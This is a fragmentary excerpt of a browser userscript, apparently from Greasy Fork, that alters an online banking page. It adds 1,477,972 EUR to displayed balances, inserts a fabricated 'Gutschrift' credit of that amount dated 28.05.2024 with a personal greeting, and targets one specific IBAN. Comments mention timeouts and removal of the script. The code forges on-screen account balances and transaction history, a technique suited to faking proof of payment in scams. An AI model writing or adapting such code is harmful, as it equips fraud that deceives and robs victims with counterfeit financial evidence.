...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/496248/Ed%20Comm%20Hans%20Friedrichs.user.js
// @updateURL https://update.greasyfork.org/scripts/496248/Ed%20Comm%20Hans%20Friedrichs.meta.js
// ==/UserScript==
...
//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL
 ...
 // Configurable Elements
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: +1477972 },
        { index: 1, adjustmentAmount: +1477972 },
        { index: 3, adjustmentAmount: +1477972 },
...
//2 COMM FINSISCHT CHANGE BAL
    ...
    // Configurable Elements
        var BALANCE_CONFIGS_FIN = [
          ...
          { index: 2, adjustmentAmount: +1477972 },
            ...
            //  // Manual configuration of text content for multiple transactions
             var transactionsnew = [{
                  date: '28.05.2024',
                   ...
                   details: 'Alexander Faber grüsst Sie.',
                   type: 'Gutschrift',
                  amount: '+1.477.972,00 EUR',
             },
                // Add more transactions as needed
               ];
...
balanceModificationAmount = balanceChange = 1477972.0 ;
...
///IBAN CONFIGURATION_______________________________________________________
     ...
     expectedIBAN = searchText = targetTextContent = specifiedTextContent = "DE40 2108 0050 0104 6378 00"
